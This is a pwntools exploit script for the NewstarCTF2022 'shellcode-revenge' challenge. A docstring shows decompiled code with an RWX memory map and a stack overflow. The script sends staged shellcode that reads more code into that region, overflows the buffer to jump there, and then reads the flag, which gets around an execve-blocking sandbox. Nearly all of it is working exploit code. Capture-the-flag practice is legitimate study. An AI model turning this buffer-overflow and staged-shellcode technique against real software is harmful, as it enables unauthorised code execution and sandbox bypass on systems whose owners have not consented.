"""NewstarCTF2022 shellcode-revenge
沙箱禁止了 execve
  char v4[40]; // [rsp+0h] [rbp-30h] BYREF
  void *buf; // [rsp+28h] [rbp-8h]

  sandbox();
  buf = mmap((void *)0x233000, 0x1000uLL, 7, 34, -1, 0LL);
  read(0, buf, 0x1AuLL);
  read(0, v4, 0x100uLL);
"""
from pwn import *

context(log_level='debug', arch='amd64', os='linux')
p = process('./pwn')

sc_custom_read = asm(shellcraft.read(0, 0x233000 + 21, 0x800))
# print(len(sc_custom_read)) # 长度 21, 上面这些shellcode 长度为21, 最后发送的内容直接写入 +21 之后的地址, 执行到0x2330000开始从+21片写入, 写入完成后执行到+21, 继续执行

p.sendline(sc_custom_read)

p.sendline(b'a' * 0x38 + p64(0x233000))

sc_cat_flag = asm(shellcraft.cat('./flag'))
p.sendline(sc_cat_flag)
# print(hex(len(sc_cat_flag)))
p.interactive()
